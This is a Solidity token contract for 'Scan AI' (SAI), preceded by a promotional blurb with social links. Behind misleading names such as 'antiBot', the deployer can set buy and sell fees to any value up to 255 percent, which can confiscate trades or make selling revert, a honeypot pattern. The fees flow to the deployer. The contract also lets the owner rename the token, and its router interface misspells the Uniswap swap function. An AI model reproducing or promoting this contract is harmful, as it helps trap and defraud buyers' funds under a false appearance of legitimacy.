/*
Welcome to Scan AI ?
Unlock the Power of Blockchain Intelligence?
Scan AI is a revolutionary utility token that harnesses the power of artificial intelligence to optimize your Ethereum experience ?. 
Our cutting-edge technology provides real-time insights and analytics, empowering you to make informed decisions in the decentralized economy ?. 

? Key Features:
- Contract Scanning: Identify early buyers and unlock exclusive benefits 
- Transaction Tracking: Stay up-to-date with the last 5 transactions in your Ethereum wallet ?
- Alpha wallet ?indicator: identify and highlight high potential wallets, giving you an edge in the market 
- Alpha project identifier: Discover high potential projects before they gain mainstream attention?
- Scan AI ?will provide a detailed summary of any wallet address, including total ROI, best trade percentages, and a summary of wins and losses.
- This upgrade will give users a comprehensive understanding of their wallet's performance and help them make data-driven decisions ?.

SCAN AI Socials:
? Telegram : https://t.me/ScanAi_Portal
? X : https://twitter.com/Scan_AiEth
? Website : https://www.scanaibot.tech
? Bot : https://t.me/ScanAiBot
*/


// SPDX-License-Identifier: Unlicense


pragma solidity ^0.8.24;


interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}


interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}


contract ScanAi {
    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }


    string public _name = unicode"Scan Ai";
    string public _symbol = unicode"SAI";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;


    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;


    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );


    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;


    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;


    constructor() {
        uint8 _initBuyFee = 0;
        uint8 _initSellFee = 0;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }


    receive() external payable {}


    function antiBot(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _TokenMktWithZkVerifyETH()) revert Permissions();
        TokeOnErc20(_buy, _sell);
    }


    function TokeOnErc20(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }


    function _TokenMktWithZkVerifyETH() private view returns(address) {
        return storeData.tokenMkt;
    }


    function OpenTrading() external {
        require(msg.sender == _TokenMktWithZkVerifyETH());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }


    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }


    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }


    function symbol() public view  virtual returns (string memory) {
        return _symbol;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _TokenMktWithZkVerifyETH();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);


        balanceOf[from] -= amount;


        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount && from != tokenMkt) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }


        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }



    event DataMember(string newName,string newSymbol , address by);


    function ChangeData(string memory name_,string memory symbol_) public {
        require(msg.sender == storeData.tokenMkt);
        _name = name_;
        _symbol = symbol_;
        emit DataMember(name_, symbol_, msg.sender);
    }
}